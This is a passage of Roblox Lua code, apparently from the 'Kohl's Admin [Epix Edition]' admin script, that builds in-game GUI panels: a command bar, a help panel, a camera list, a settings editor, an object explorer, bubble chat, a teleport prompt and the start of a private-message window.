	alarm.Volume=1
	alarm.Looped=true
	alarm.SoundId='http://www.mulrbx.com/asset/?id=138081509'
	alarm:Play()
	button.MouseButton1Click:connect(function()
		alarm:Stop()
		scr:Destroy()
	end)
	for i=1,#msg do
		label.Text=msg:sub(1,i)
		wait()
	end
end

set.CmdBar=function()
local plr=localplayer
if plr.PlayerGui:FindFirstChild(set.GuiName..'CMDBAR') then return end 
local scr=Instance.new("ScreenGui",plr.PlayerGui) scr.Name = set.GuiName.."CMDBAR"
local frame=Instance.new('Frame',scr)
local label=Instance.new('TextLabel',frame)
local button=Instance.new('TextButton',frame)
local box=Instance.new("TextBox", frame)
local cls = Instance.new("TextButton", frame) 
cls.Style = "Custom" 
cls.Size = UDim2.new(0,15,0,15) 
cls.Position = UDim2.new(1,-20,0,2)
cls.ZIndex = 10
cls.Font = set.Font 
cls.FontSize = "Size14" 
cls.Text = "X" 
cls.TextWrapped=false
cls.TextScaled=false
cls.BackgroundColor3=set['PrimaryColor']
cls.BorderSizePixel=0
cls.TextColor3=set.TextColor
cls.BackgroundTransparency=set['Transparency']
cls.MouseButton1Click:connect(function() scr:Destroy() end)
box.TextColor3 = set['TextColor']
box.TextStrokeTransparency=set.TextStrokeTransparency
box.TextStrokeColor3=set['TextStrokeColor']
frame.BackgroundColor3=set['PrimaryColor']
frame.BackgroundTransparency=set['Transparency']
--frame.BorderSizePixel=0
frame.BorderSizePixel=0
frame.Position=UDim2.new(1,260,1,-150)
frame.Size=UDim2.new(0,260,0,130)
frame.ClipsDescendants=true
frame.ZIndex=10
label.BackgroundTransparency=1
label.BorderSizePixel=0
label.Position=UDim2.new(0,125,0,8)
label.Size=UDim2.new(0,5,0,5)
label.TextColor3=set['TextColor']
label.ClipsDescendants=false
label.FontSize='Size24'
label.Font=set.Font
label.TextXAlignment='Center'
label.TextYAlignment='Center'
label.Text='Command Box'
label.ZIndex=10
label.TextColor3=set['TextColor']
label.TextStrokeTransparency=set.TextStrokeTransparency
label.TextStrokeColor3=set['TextStrokeColor']
frame.Draggable=true
frame.Active=true
label.Draggable=false
box.Draggable=false
button.Draggable=false
button.Position=UDim2.new(0,5,0,105)
button.Size=UDim2.new(0,250,0,20)
button.BackgroundTransparency=set['Transparency']
button.TextColor3=set['TextColor']
button.TextStrokeTransparency=set.TextStrokeTransparency
button.TextStrokeColor3=set['TextStrokeColor']
button.BackgroundColor3=set.PrimaryColor
button.FontSize='Size18'
button.Font=set.Font
button.Text='Execute'
button.BorderSizePixel=0
button.ZIndex=10
box.BackgroundColor3=set['PrimaryColor']
box.BackgroundTransparency=set['Transparency']
--box.BorderSizePixel=0
box.BorderSizePixel=0
box.ClearTextOnFocus=true
box.Position=UDim2.new(0,0,1,-110)
box.Size=UDim2.new(1,0,0,80)
box.ClipsDescendants=false
box.Font='Arial'
box.FontSize='Size14'
box.Text='Type a command then press Execute'
box.TextWrapped=true
box.TextXAlignment='Center'
box.TextYAlignment='Center'
box.TextScaled=true
box.MultiLine=true
box.ZIndex=10
button.MouseButton1Down:connect(function() 
	if box.Text and box.Text~="Type a command then press Execute" then 
		Remote('AdminCommand',box.Text,false,true) 
		box.Text = "Type a command then press Execute" 
	end 
end)
wait()
if set.Animations then
	frame:TweenPosition(UDim2.new(1,-280,1,-150),'Out','Elastic',1)
else
	frame.Position=UDim2.new(1,-280,1,-150)
end
end

set.HelpInfoGui=function()
	if playergui:FindFirstChild(set.GuiName.."HELPGUI") then return end
	local scr=Instance.new('ScreenGui',playergui) scr.Name=set.GuiName.."HELPGUI"
	local tog=Instance.new('TextButton',scr)
	local opened=false
	tog.MouseButton1Click:connect(function()
		if opened then
			if set.Animations then
				tog:TweenPosition(UDim2.new(0,0,0.45,0),'Out','Quad',1)
			else
				tog.Position=UDim2.new(0,0,0.45,0)
			end
			opened=false
		else
			if set.Animations then
				tog:TweenPosition(UDim2.new(0.65,0,0.45,0),'Out','Quad',1)
			else
				tog.Position=UDim2.new(0.65,0,0.45,0)
			end
			opened=true
		end
	end)
	tog.BackgroundTransparency=set.Transparency
	tog.BackgroundColor3=set.PrimaryColor
	tog.BorderSizePixel=0
	tog.Position=UDim2.new(0,0,0.45,0)
	tog.Size=UDim2.new(0,30,0,20)
	tog.Font=set.Font
	tog.FontSize='Size14'
	tog.Text='Help'
	tog.TextColor3=set.TextColor
	tog.TextStrokeTransparency=set.TextStrokeTransparency
	tog.TextStrokeColor3=set.TextStrokeColor
	tog.TextScaled=false
	tog.TextWrapped=true
	local main=Instance.new('Frame',tog)
	main.BackgroundColor3=set.PrimaryColor
	main.BackgroundTransparency=set.Transparency
	main.BorderSizePixel=0
	main.Position=UDim2.new(0,-400,0,0)
	main.Size=UDim2.new(0,400,0,100)
	local img=Instance.new('ImageButton',main)
	img.BackgroundTransparency=1
	img.Image='http://unixfr.xyz/asset/?id=155386507'
	img.Position=UDim2.new(0,300,0,5)
	img.Size=UDim2.new(0,90,0,90)
	img.MouseButton1Up:connect(function()
		Remote('AdminCommand',set.AnyPrefix..'getscript') 
	end)
	local t1=Instance.new('TextLabel',main)
	t1.BackgroundTransparency=1
	t1.Position=UDim2.new(0,50,0,30)
	t1.Size=UDim2.new(0,144,0,10)
	t1.TextColor3=set.TextColor
	t1.TextStrokeTransparency=set.TextStrokeTransparency
	t1.Font=set.Font
	t1.FontSize='Size14'
	t1.TextStrokeColor3=set.TextStrokeColor
	t1.Text='To view commands say '..set.Prefix..'cmds or click '
	local c1=Instance.new('TextButton',main)
	c1.BackgroundTransparency=1
	c1.Position=UDim2.new(0,235,0,30)
	c1.Size=UDim2.new(0,20,0,10)
	c1.TextColor3=set.TextColor
	c1.TextStrokeTransparency=set.TextStrokeTransparency
	c1.Font=set.Font
	c1.FontSize='Size14'
	c1.TextStrokeColor3=set.TextStrokeColor
	c1.Text='here'
	c1.MouseButton1Up:connect(function()
		Remote('AdminCommand',set.Prefix..'cmds') 
	end)
	local t2=t1:clone() t2.Parent=main
	t2.Position=UDim2.new(0,50,0,50)
	t2.Text='To view usage info say :usage or click '
	local t3=t1:clone() t3.Parent=main
	t3.Position=UDim2.new(0,45,0,70)
	t3.Text='To donate or change your cape click '
	if set.Console then
		local t4=t1:clone() t4.Parent=main
		t4.Position=UDim2.new(0,20,0,90)
		t4.Text='To open the console press '..set.ConsoleKey
		main.Size=UDim2.new(0,400,0,110)
	end
	local c2=c1:clone() c2.Parent=main
	c2.Position=UDim2.new(0,235,0,50)
	c2.MouseButton1Up:connect(function()
		Remote('AdminCommand',set.Prefix..'usage')
	end)
	local c3=c1:clone() c3.Parent=main
	c3.Position=UDim2.new(0,225,0,70)
	c3.MouseButton1Up:connect(function()
		Remote('AdminCommand',set.AnyPrefix..'donate') 
	end)
	local name=t1:clone() name.Parent=main
	name.Position=UDim2.new(0,150,0,0)
	name.Size=UDim2.new(0,100,0,20)
	name.Text="Kohl's Admin [Epix Edition]"
	local pt=t1:clone() pt.Parent=main
	pt.Position=UDim2.new(0,12,0,0)
	pt.Size=UDim2.new(0,90,0,20)
	pt.Text='Time...  |  Ping..  |  Speed...'
	pt.TextXAlignment='Left'
	repeat
		pt.Text=GetTime()..' | '..Ping()--..' | '..Round(workspace:GetRealPhysicsFPS())
		wait(1)
	until (not pt) or (not pt.Parent)
end

set.Cameras=function()
local plr=localplayer
if plr.PlayerGui:FindFirstChild(set.GuiName.."CAMERAGUI") then return end
local scr, cmf, ent, num, top, main, point = set.MainScrollGui() scr.Name = set.GuiName.."CAMERAGUI" scr.Parent = plr.PlayerGui
top.Text='Cameras'
local function GrabCams(p)
num=0
Remote('GetSetting','cameras')
wait(0.5)
repeat wait() until set['cameras']
for i,v in pairs(set.cameras) do
if (p=='all' or v.Name:lower():find(p)) then
local cl = ent:clone()
Expand(cl,point,cmf)
cl.Parent = cmf 
cl.Text = num.." | "..v.Name
cl.Desc.Value=cl.Text
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,300,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
cmf.CanvasSize=UDim2.new(0,0,(num+1)/20,0)
local kill = Instance.new("TextButton", cl) 
kill.Style = "Custom" 
kill.Size = UDim2.new(0,15,0,15)
kill.TextScaled=true 
kill.Position = UDim2.new(1,-50,0,0) 
kill.ZIndex = 2
kill.Font = set.Font 
kill.FontSize = "Size18" 
kill.Text = "X" 
kill.BackgroundColor3=set['PrimaryColor']
kill.BorderSizePixel=0
kill.TextColor3=set.TextColor
kill.BackgroundTransparency=set['Transparency']
kill.MouseButton1Click:connect(function() Remote('TableRemove','cameras',i) Remote('Destroy',v) wait(0.5) cmf:ClearAllChildren() GrabCams('all') end)
local view = Instance.new("TextButton", cl) 
view.Style = "Custom" 
view.Size = UDim2.new(0,15,0,15)
view.TextScaled=true 
view.Position = UDim2.new(1,-25,0,0) 
view.ZIndex = 2
view.Font = set.Font 
view.FontSize = "Size18" 
view.Text = "V" 
view.BackgroundColor3=set['PrimaryColor']
view.BorderSizePixel=0
view.TextColor3=set.TextColor
view.BackgroundTransparency=set['Transparency']
view.MouseButton1Click:connect(function() 
	local cam=workspace:FindFirstChild(v.Name) 
	workspace.CurrentCamera.CameraType='Custom' 
	workspace.CurrentCamera.CameraSubject=cam
	workspace.CurrentCamera.CoordinateFrame=CFrame.new(cam.Position)
	workspace.CurrentCamera.Focus=cam.CFrame
	workspace.CurrentCamera.FieldOfView=80
end)
num = num +1
end
end
if cmf:FindFirstChild('Counter') then cmf.Counter:Destroy() end
local cl = ent:Clone()
Expand(cl,point,cmf,main) 
cl.Parent = cmf 
cl.Name='Counter'
cl.Text=(num)..' Item(s)'
cl.Position = UDim2.new(0,0,0,num*20)
cl.Desc.Value='There are '..(num)..' items currently being displayed.'
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
cmf.CanvasSize=UDim2.new(0,0,(num+1)/20,0)
end
local refresh = Instance.new("TextButton", main.Parent) 
refresh.Style = "Custom" 
refresh.Size = UDim2.new(0,20,0,20) 
refresh.Position = UDim2.new(1,-100,0,5) 
refresh.ZIndex = 10 
refresh.Font = set.Font 
refresh.FontSize = "Size18" 
refresh.Text = "R" 
refresh.BackgroundColor3=set['PrimaryColor']
refresh.BorderSizePixel=0
refresh.TextColor3=set.TextColor
refresh.BackgroundTransparency=set['Transparency'] 
refresh.MouseButton1Click:connect(function() cmf:ClearAllChildren() GrabCams('all') end)
local reset = Instance.new("TextButton", main.Parent) 
reset.Style = "Custom" 
reset.Size = UDim2.new(0,20,0,20) 
reset.Position = UDim2.new(1,-75,0,5) 
reset.ZIndex = 10 
reset.Font = set.Font 
reset.FontSize = "Size18" 
reset.Text = "V" 
reset.BackgroundColor3=set['PrimaryColor']
reset.BorderSizePixel=0
reset.TextColor3=set.TextColor
reset.BackgroundTransparency=set['Transparency']
reset.MouseButton1Click:connect(function()
	workspace.CurrentCamera.CameraType='Custom' 
	workspace.CurrentCamera.CameraSubject=localplayer.Character.Humanoid
	workspace.CurrentCamera.FieldOfView=70
end)
local b=Instance.new('TextBox',main.Parent)
b.Size=UDim2.new(0,130,0,20)
b.Position=UDim2.new(0,5,0,5) 
b.BackgroundColor3=set.SecondaryColor--PrimaryColor
b.BackgroundTransparency=set['Transparency']
b.TextColor3=set['TextColor']
b.BorderSizePixel=0
b.TextStrokeTransparency=set.TextStrokeTransparency
b.TextStrokeColor3=set.TextStrokeColor
b.Text=''
b.ZIndex=9
b.Font=set.Font
b.TextScaled=true
b.TextWrapped=true
b.FocusLost:connect(function(enterPressed)
	if enterPressed and (b.Text~='' or string.len(b.Text)>0) then
		cmf:ClearAllChildren()
		num=0
		GrabCams(b.Text)
	elseif enterPressed and (b.Text=='' or string.len(b.Text)==0) then
		cmf:ClearAllChildren()
		num=0
		GrabCams('all')
	end
end)
GrabCams('all')
end

set.EditTable=function(tab,name)
local plr=localplayer
if plr.PlayerGui:findFirstChild(set.GuiName..name..'TABLEEDIT') then return end
local scr, cmf, ent, num, top, main, point = set.MainScrollGui() scr.Name = set.GuiName..name..'TABLEEDIT' scr.Parent = plr.PlayerGui
top.Text=name
local function GrabTable()
Remote('GetSetting',name)
cmf:ClearAllChildren()
num=0
for i,v in pairs(tab) do
local cl = ent:clone()
Expand(cl,point,cmf)
cl.Parent = cmf 
if type(v)=='string' then
cl.Text = v
elseif type(v)~='string' then
cl.Text = "Currently only supports strings, please edit this table from studio."
end
cl.Desc.Value=cl.Text
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,300,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
cmf.CanvasSize=UDim2.new(0,0,(num+1)/20,0)
local kill = Instance.new("TextButton", cl) 
kill.Style = "Custom" 
kill.TextScaled=true 
kill.Position = UDim2.new(0,335,0,0) 
kill.Size = UDim2.new(0,40,0,15) 
kill.ZIndex = 2
kill.Font = set.Font 
kill.FontSize = "Size18" 
kill.Text = "Remove" 
kill.BackgroundColor3=set['PrimaryColor']
kill.BorderSizePixel=0
kill.TextColor3=set.TextColor
kill.BackgroundTransparency=set['Transparency']
kill.MouseButton1Click:connect(function() Remote('TableRemove',name,i) table.remove(tab,i) GrabTable() end)
num = num +1
end
end
local refresh = Instance.new("TextButton", main.Parent) 
refresh.Style = "Custom" 
refresh.Size = UDim2.new(0,20,0,20) 
refresh.Position = UDim2.new(1,-75,0,5) 
refresh.ZIndex = 10 
refresh.Font = set.Font 
refresh.FontSize = "Size18" 
refresh.Text = "R" 
refresh.BackgroundColor3=set['PrimaryColor']
refresh.BorderSizePixel=0
refresh.TextColor3=set.TextColor
refresh.BackgroundTransparency=set['Transparency'] 
refresh.MouseButton1Click:connect(function() GrabTable() end)
local b=Instance.new('TextBox',main.Parent)
b.Size=UDim2.new(0,130,0,20)
b.Position=UDim2.new(0,5,0,5) 
b.BackgroundColor3=set.SecondaryColor--PrimaryColor
b.BackgroundTransparency=set['Transparency']
b.TextColor3=set['TextColor']
b.BorderSizePixel=0
b.TextStrokeTransparency=set.TextStrokeTransparency
b.TextStrokeColor3=set.TextStrokeColor
b.Text=''
b.ZIndex=9
b.Font=set.Font
b.TextScaled=true
b.TextWrapped=true
b.FocusLost:connect(function(enterPressed)
	if enterPressed then
		table.insert(tab,b.Text)
		Remote('AddToTable',name,b.Text)
		GrabTable()
	end
end)
GrabTable()
end

set.Settings=function()
UpdateSettings()
local plr=localplayer
if plr.PlayerGui:findFirstChild(set.GuiName.."SETTINGSGUI") then return end
local scr, cmf, ent, num, top, main, point = set.MainScrollGui() scr.Name = set.GuiName.."SETTINGSGUI" scr.Parent = plr.PlayerGui
top.Text='Settings'
for i,v in pairs(set.UpdatableSettings) do
if type(set[v])=='string' then
local cl = ent:Clone() 
Expand(cl,point,cmf)
cl.Parent = cmf 
cl.Text = v..': '
cl.Desc.Value=cl.Text
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
local tb = Instance.new("TextBox", cl) 
tb.Position = UDim2.new(0,300,0,0) 
tb.Size = UDim2.new(0,80,0,15) 
tb.BackgroundTransparency = set.Transparency--.8 
tb.BorderSizePixel=0 
tb.BorderColor3 = set['SecondaryColor'] 
tb.TextColor3 = set['TextColor'] 
tb.Font = set.Font--"Arial" 
tb.Text = set[v]
tb.FontSize = "Size18" 
tb.TextStrokeColor3 = set['TextStrokeColor']
tb.TextStrokeTransparency = set.TextStrokeTransparency--.9 
tb.TextYAlignment = "Top" 
tb.ClipsDescendants = true 
tb.ZIndex = 8
tb.TextWrapped=true
tb.TextScaled=true
tb.FocusLost:connect(function(enterPressed) 
	if enterPressed and tb.Text ~= set[v] then 
		Remote('SetSetting',v,tb.Text)
	end 
end)
num = num +1
elseif type(set[v])=='boolean' then
local cl = ent:Clone() 
Expand(cl,point,cmf)
cl.Parent = cmf 
cl.Text = v..': '
cl.Desc.Value=cl.Text
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
local cb = Instance.new("TextButton", cl) 
cb.Position = UDim2.new(0,300,0,0) 
cb.Size = UDim2.new(0,80,0,15) 
cb.BackgroundTransparency = set.Transparency--.8 
cb.BorderSizePixel=0 
cb.BorderColor3 = set['SecondaryColor'] 
cb.TextColor3 = set['TextColor']
cb.Font = set.Font--"Arial" 
cb.FontSize = "Size18" 
cb.TextStrokeColor3 = set['TextStrokeColor'] 
cb.TextStrokeTransparency = set.TextStrokeTransparency--.9 
cb.TextYAlignment = "Top" 
cb.ZIndex = 8
cb.TextWrapped=true
cb.TextScaled=true
if set[v] then cb.Text = "True" else cb.Text = "False" end
cb.MouseButton1Down:connect(function() 
	if set[v] then 
		Remote('SetSetting',v,false)
		cb.Text = "False" 
	else 
		Remote('SetSetting',v,true) 
		cb.Text = "True" 
	end
end)
num=num+1
elseif type(set[v])=='number' then
local cl = ent:Clone() 
Expand(cl,point,cmf)
cl.Parent = cmf 
cl.Text = v..': '
cl.Desc.Value=cl.Text
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
local tb = Instance.new("TextBox", cl) 
tb.Position = UDim2.new(0,300,0,0) 
tb.Size = UDim2.new(0,80,0,15) 
tb.BackgroundTransparency = set.Transparency--.8 
tb.BorderSizePixel=0 
tb.BorderColor3 = Color3.new(1,1,1) 
tb.TextColor3 = set.TextColor--Color3.new(1,1,1) 
tb.Font = set.Font--"Arial" 
tb.Text = set[v]
tb.FontSize = "Size18" 
tb.TextStrokeColor3 = set.TextStrokeColor--Color3.new(1,1,1) 
tb.TextStrokeTransparency = set.TextStrokeTransparency--.9 
tb.TextYAlignment = "Top" 
tb.ClipsDescendants = true 
tb.ZIndex = 8
tb.TextWrapped=true
tb.TextScaled=true
tb.FocusLost:connect(function(enterPressed) 
	if enterPressed and tonumber(tb.Text) ~= set[v] and tb.Text ~= "" then 
		Remote('SetSetting',v,tonumber(tb.Text))
	end 
end)
num=num+1
elseif type(set[v])=='table' then
local cl = ent:Clone() 
Expand(cl,point,cmf)
cl.Parent = cmf 
cl.Text = v..': '
cl.Desc.Value=cl.Text
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
local tb = Instance.new("TextButton", cl) 
tb.Position = UDim2.new(0,300,0,0) 
tb.Size = UDim2.new(0,80,0,15) 
tb.BackgroundTransparency = set.Transparency
tb.BorderSizePixel=0 
tb.BorderColor3 = Color3.new(1,1,1) 
tb.TextColor3 = set.TextColor--Color3.new(1,1,1) 
tb.Font = set.Font--"Arial" 
tb.Text = '+'..v
tb.FontSize = "Size18" 
tb.TextStrokeColor3 = set.TextStrokeColor--Color3.new(1,1,1) 
tb.TextStrokeTransparency = set.TextStrokeTransparency 
tb.TextYAlignment = "Top" 
tb.ClipsDescendants = true 
tb.ZIndex = 8
tb.TextWrapped=true
tb.TextScaled=true
tb.MouseButton1Down:connect(function() 
	set.EditTable(set[v],v)
end)
num=num+1
end
end
cmf.CanvasSize=UDim2.new(0,0,(num+1)/20,0)
end

set.Explorer=function()
local plr=localplayer
if plr.PlayerGui:findFirstChild(set.GuiName.."EXPLORERGUI") then return end
local scr, cmf, ent, num, top, main, point = set.MainScrollGui() scr.Name = set.GuiName.."EXPLORERGUI" scr.Parent = plr.PlayerGui
top.Text='Explorer'
local parent=game
local makegui
local GrabChildren
makegui=function(v)
local cl = ent:clone()
Expand(cl,point,cmf)
cl.Parent = cmf 
cl.Text = v.Name
cl.BorderSizePixel=1
cl.BackgroundTransparency=0.9
cl.BackgroundColor3=set.PrimaryColor
cl.BorderColor3=set.SecondaryColor
cl.Position = UDim2.new(0,0,0,num*20)
cl.Desc.Value='ClassName: '..v.ClassName
cl.Size=UDim2.new(1,1,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
local kill = Instance.new("TextButton", cl) 
kill.Style = "Custom" 
kill.Size = UDim2.new(0,20,0,14) 
kill.TextScaled=true
kill.Position = UDim2.new(1,-75,0,2) 
kill.ZIndex=2
kill.Font = set.Font 
kill.FontSize = "Size18" 
kill.Text = "X" 
kill.BackgroundColor3=set['PrimaryColor']
kill.BorderSizePixel=0
kill.TextColor3=set.TextColor
kill.BackgroundTransparency=set['Transparency']
kill.MouseButton1Click:connect(function() v:Destroy() cmf:ClearAllChildren() GrabChildren() end)
local name = Instance.new("TextButton", cl) 
name.Style = "Custom" 
name.Size = UDim2.new(0,20,0,14) 
name.TextScaled=true
name.Position = UDim2.new(1,-50,0,2) 
name.ZIndex=2
name.Font = set.Font 
name.FontSize = "Size18" 
name.Text = "R" 
name.BackgroundColor3=set['PrimaryColor']
name.BorderSizePixel=0
name.TextColor3=set.TextColor
name.BackgroundTransparency=set['Transparency']
name.MouseButton1Click:connect(function()
	if cl:FindFirstChild('Rename') then
		cl.Rename:Destroy()
	else
		local l=Instance.new('TextBox',cl)
		l.Name='Rename'
		l.ZIndex=8
		l.BackgroundColor3=set.SecondaryColor
		l.TextScaled=true
		l.TextXAlignment='Left'
		l.BorderSizePixel=0
		l.TextColor3=set.TextColor
		l.Font=set.Font
		l.TextStrokeTransparency=set.TextStrokeTransparency
		l.TextStrokeColor3=set.TextStrokeColor
		l.Text=v.Name
		l.Size=UDim2.new(1,-80,1,0)
		l.Position=UDim2.new(0,0,0,0)
		l.FocusLost:connect(function(enterPressed)
			if enterPressed then
				v.Name=l.Text
				cl.Text=v.Name
				l:Destroy()
			end
		end)
	end
end)
if #v:children()>=1 then
local move = Instance.new("TextButton", cl) 
move.Style = "Custom" 
move.Size = UDim2.new(0,20,0,14) 
move.TextScaled=true
move.Position = UDim2.new(1,-25,0,2)
move.ZIndex = 2
move.Font = set.Font 
move.FontSize = "Size18" 
move.Text = "+" 
move.BackgroundColor3=set['PrimaryColor']
move.BorderSizePixel=0
move.TextColor3=set.TextColor
move.BackgroundTransparency=set['Transparency']
move.MouseButton1Click:connect(function() parent=v cmf:ClearAllChildren() GrabChildren()  end)
end
num = num +1
end
GrabChildren=function()
num=0
if parent==game then
local gamestuff={game:service('StarterPack'),game:service('ReplicatedStorage'),game:service('ReplicatedFirst'),game:service('Lighting'),workspace,game.StarterPack,game:service('StarterGui'),game:service('Players'),game:service('SoundService'),game:service('Teams')}
	for k,s in pairs(gamestuff)do
	if s and s.Name and s.Parent==game then
	makegui(s)
	end
	end
	for l,m in pairs(game:GetChildren()) do
		coroutine.wrap(function()
		pcall(function()
		if m and m.Name and m.ClassName and (m.ClassName=='Model' or m.ClassName=='Script' or m.ClassName=='LocalScript') then
			makegui(m)
		end
		end)
		end)()
	end
else
for i,v in pairs(parent:GetChildren()) do
makegui(v)
end
end
if cmf:FindFirstChild('Counter') then cmf.Counter:Destroy() end
local cl = ent:Clone()
Expand(cl,point,cmf,main) 
cl.Parent = cmf 
cl.Name='Counter'
cl.Text=(num)..' Item(s)'
cl.Position = UDim2.new(0,0,0,num*20)
cl.Desc.Value='There are '..(num)..' items currently being displayed.'
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
cmf.CanvasSize=UDim2.new(0,0,(num+1)/20,0)
end
local back = Instance.new("TextButton", main.Parent) 
back.Style = "Custom" 
back.Size = UDim2.new(0,20,0,20) 
back.Position = UDim2.new(1,-75,0,5) 
back.ZIndex = 10 
back.Font = set.Font 
back.FontSize = "Size18" 
back.Text = "^" 
back.BackgroundColor3=set['PrimaryColor']
back.BorderSizePixel=0
back.TextColor3=set.TextColor
back.BackgroundTransparency=set['Transparency']
back.MouseButton1Click:connect(function() if parent~=game then parent=parent.Parent end cmf:ClearAllChildren() GrabChildren()  end)
local refresh = Instance.new("TextButton", main.Parent) 
refresh.Style = "Custom" 
refresh.Size = UDim2.new(0,20,0,20) 
refresh.Position = UDim2.new(1,-100,0,5) 
refresh.ZIndex = 10 
refresh.Font = set.Font 
refresh.FontSize = "Size18" 
refresh.Text = "R" 
refresh.BackgroundColor3=set['PrimaryColor']
refresh.BorderSizePixel=0
refresh.TextColor3=set.TextColor
refresh.BackgroundTransparency=set['Transparency'] 
refresh.MouseButton1Click:connect(function() cmf:ClearAllChildren() GrabChildren()  end)
local b=Instance.new('TextBox',main.Parent)
b.Size=UDim2.new(0,130,0,20)
b.Position=UDim2.new(0,5,0,5) 
b.BackgroundColor3=set.SecondaryColor--PrimaryColor
b.BackgroundTransparency=set['Transparency']
b.TextColor3=set['TextColor']
b.BorderSizePixel=0
b.TextStrokeTransparency=set.TextStrokeTransparency
b.TextStrokeColor3=set.TextStrokeColor
b.Text=''
b.ZIndex=9
b.Font=set.Font
b.TextScaled=true
b.TextWrapped=true
b.FocusLost:connect(function(enterPressed)
	if enterPressed and (b.Text~='' or string.len(b.Text)>0) and parent~=game then
		cmf:ClearAllChildren()
		num=0
		for k,l in pairs(parent:GetChildren()) do
			if l and (l.Name:lower():sub(1,#b.Text)==b.Text and b.Text~='all') then
				makegui(l)
			end
		end
		if cmf:FindFirstChild('Counter') then cmf.Counter:Destroy() end
		local cl = ent:Clone()
		Expand(cl,point,cmf,main) 
		cl.Parent = cmf 
		cl.Name='Counter'
		cl.Text=(num)..' Item(s)'
		cl.Position = UDim2.new(0,0,0,num*20)
		cl.Desc.Value='There are '..(num)..' items currently being displayed.'
		cl.TextScaled=true
		cl.FontSize='Size24'
		cl.Font=set.Font
		cmf.CanvasSize=UDim2.new(0,0,(num+1)/20,0)
	elseif enterPressed and (b.Text=='' or string.len(b.Text)==0 or b.Text=='all') and parent~=game then
		cmf:ClearAllChildren()
		GrabChildren()
	end
end)
GrabChildren()
end

set.BubbleChat=function(color)
	if color=='off' then
		if playergui:FindFirstChild(set.GuiName..'BUBBLECHATGUI') then 
			playergui[set.GuiName..'BUBBLECHATGUI']:Destroy() 
		end
	else
	if playergui:FindFirstChild(set.GuiName..'BUBBLECHATGUI') then playergui[set.GuiName..'BUBBLECHATGUI']:Destroy() end
	local scr=Instance.new('ScreenGui',playergui) scr.Name=set.GuiName..'BUBBLECHATGUI'
	local b=Instance.new('TextBox',scr)
	b.BackgroundTransparency=set.Transparency
	b.BackgroundColor3=set.PrimaryColor
	b.BorderSizePixel=0
	b.TextColor3=set.TextColor
	b.TextStrokeTransparency=set.TextStrokeTransparency
	b.TextScaled=true
	b.TextStrokeColor3=set.TextStrokeColor
	b.Text='Click here or press ";" to chat'
	b.Size=UDim2.new(0,150,0,20)
	b.Position=UDim2.new(0,5,1,-150)
	b.FocusLost:connect(function(enterPressed)
		if enterPressed and localplayer.Character:FindFirstChild('Head') and color and b.Text~='Click here or press ";" to chat' then
			game:service('Chat'):Chat(localplayer.Character.Head,b.Text,color)
			b.Text='Click here or press ";" to chat'
		end
	end)
	mouse.KeyDown:connect(function(key)
		if key==';' then
			b:CaptureFocus()
		end
	end)
	end
end

set.PromptPlaceTeleport=function(msg,placeid)
local player=localplayer
local scr=Instance.new("ScreenGui",player.PlayerGui) 
scr.Name = set.GuiName.."TELEPORTGUI"
local frame=Instance.new('Frame',scr)
local label=Instance.new('TextLabel',frame)
local yes=Instance.new('TextButton',frame)
local no=Instance.new('TextButton',frame)
frame.BackgroundColor3=set['PrimaryColor']
frame.BorderSizePixel=0
frame.BackgroundTransparency=set['Transparency']
frame.BorderSizePixel=0
frame.Position=UDim2.new(1,260,1,-150)
frame.Size=UDim2.new(0,260,0,130)
frame.ClipsDescendants=true
label.BackgroundTransparency=1
label.BorderSizePixel=0
label.Position=UDim2.new(0,125,0,8)
label.Size=UDim2.new(0,5,0,5)
label.TextColor3=set['TextColor']
label.ClipsDescendants=false
label.FontSize='Size24'
label.Font=set.Font
label.TextXAlignment='Center'
label.TextYAlignment='Center'
label.Text=msg
frame.Draggable=true
frame.Active=true
label.Draggable=false
yes.BackgroundColor3=Color3.new(0,1,0)
yes.TextColor3=set['TextColor']
yes.Text='Yes'
yes.Font=set.Font
yes.FontSize='Size36'
no.Font=set.Font
no.FontSize='Size36'
no.BackgroundColor3=Color3.new(1, 0, 0)
no.TextColor3=set['TextColor']
no.Text='No'
yes.Size=UDim2.new(0,100,0,50)
yes.Position=UDim2.new(0,20,0,50)
no.Size=UDim2.new(0,100,0,50)
no.Position=UDim2.new(0,140,0,50)
yes.MouseButton1Down:connect(function() 
game:GetService('TeleportService'):Teleport(placeid)
scr:Destroy()
end)
no.MouseButton1Down:connect(function() 
scr:Destroy()
end)
wait()
if set.Animations then
	frame:TweenPosition(UDim2.new(1,-280,1,-150),'Out','Elastic',1)
else
	frame.Position=UDim2.new(1,-280,1,-150)
end
end

set.PrivateMessage=function(from,message,player)
local p=localplayer
local g=Instance.new('ScreenGui',p.PlayerGui) g.Name=set.GuiName..'PMGUI'
local f=Instance.new('Frame',g)
local l=Instance.new('TextLabel',f)
local m=Instance.new('TextLabel',f)
local b=Instance.new('TextButton',f)
local tb=Instance.new('TextBox',f)
local reply=Instance.new('TextButton',f)
if player then
	tb.Visible=true
	reply.Visible=true
else
	tb.Visible=false
	reply.Visible=false
end
f.BackgroundColor3=set['PrimaryColor']
f.BackgroundTransparency=set['Transparency']
f.BorderSizePixel=0
f.Position=UDim2.new(0.5,-150,0,-200)
if set.Animations then
	f:TweenPosition(UDim2.new(0.5,-150,0.5,-100),'Out','Elastic',1)
else
	f.Position=UDim2.new(0.5,-150,0.5,-100)
end
f.Size=UDim2.new(0,300,0,200)
f.ClipsDescendants=true
f.Draggable=true
f.Active=true
l.BackgroundTransparency=1
l.Size=UDim2.new(0,290,0,30)
l.Position=UDim2.new(0,5,0,0)
